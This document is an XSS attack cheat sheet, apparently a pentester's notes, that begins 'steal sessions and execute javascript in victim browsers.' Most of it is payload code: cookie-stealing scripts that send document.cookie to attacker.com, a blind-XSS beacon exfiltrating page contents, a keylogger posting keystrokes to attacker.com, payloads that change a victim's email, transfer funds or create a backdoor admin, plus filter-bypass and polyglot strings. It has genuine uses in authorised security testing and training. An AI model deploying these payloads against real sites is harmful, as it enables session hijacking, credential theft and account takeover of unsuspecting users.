# steal sessions and execute javascript in victim browsers.

## quick test payloads

basic proof of concept:
```html
<script>alert(document.domain)</script>
<script>alert('xss')</script>
<img src=x onerror=alert('xss')>
<svg onload=alert('xss')>
```

## reflected xss

user input directly echoed in response without sanitization.

**test locations:**
- url parameters: `?search=<script>alert(1)</script>`
- form inputs reflected in error messages
- http headers (user-agent, referer) if displayed

**example attack:**
```html
http://target.com/search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

## stored xss  

payload persisted in database, executes for all users viewing content.

**test locations:**
- comment sections
- user profiles  
- file upload descriptions
- any persistent user content

**session stealing payload:**
```html
<script>
fetch('https://attacker.com/steal?cookie=' + btoa(document.cookie));
</script>
```

## dom-based xss

javascript execution via client-side dom manipulation.

**vulnerable patterns:**
```javascript
// dangerous dom sinks
document.innerHTML = userInput;
document.write(location.hash);
eval(userInput);
```

**test payload:**
```html
#<script>alert('dom-xss')</script>
<iframe src="javascript:alert('xss')">
```

## blind xss

stored xss where you can't see if payload executed.

**callback payload:**
```html
<script>
var i = new Image();
i.src = 'http://attacker.com/log?url=' + encodeURIComponent(window.location.href) + 
        '&cookie=' + encodeURIComponent(document.cookie) + 
        '&dom=' + encodeURIComponent(document.documentElement.outerHTML);
</script>
```

**keylogger payload:**
```html
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/log?key=' + btoa(e.key));
}
</script>
```

## business logic exploitation

target specific application functions:
```html
<script>
// change email for password reset
user.changeEmail('attacker@evil.com');

// transfer funds  
bank.transfer('attacker_account', 10000);

// admin actions
admin.createUser('backdoor', 'password123');
</script>
```

## filter bypass techniques

**escape context:**
```html
"><script>alert('xss')</script>
';alert('xss');//
```

**case variation:**
```html
<Script>alert('xss')</Script>
<SCRIPT>alert('xss')</SCRIPT>
```

**filter evasion:**
```html
<s<script>cript>alert('xss')</script>
<scr<script>ipt>alert('xss')</script>
```

**event handlers:**
```html
<img src=x onerror="alert('xss')">
<body onload="alert('xss')">
<input onfocus="alert('xss')" autofocus>
```

**javascript protocol:**
```html
<a href="javascript:alert('xss')">click</a>
<iframe src="javascript:alert('xss')">
```

## polyglot payload

universal xss string that bypasses multiple contexts:
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('xss') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('xss')//>\x3e
```

## operational notes

- test every input field, parameter, and header
- [!] stored xss affects all users - test in isolated environment
- check both client-side and server-side input validation
- look for dangerous javascript functions in source code
- use browser dev tools to identify dom manipulation points

**tools:**
- xss hunter express for blind testing
- burp suite intruder for systematic testing
- dalfox for automated xss scanning

# TODO: add waf bypass techniques for common filters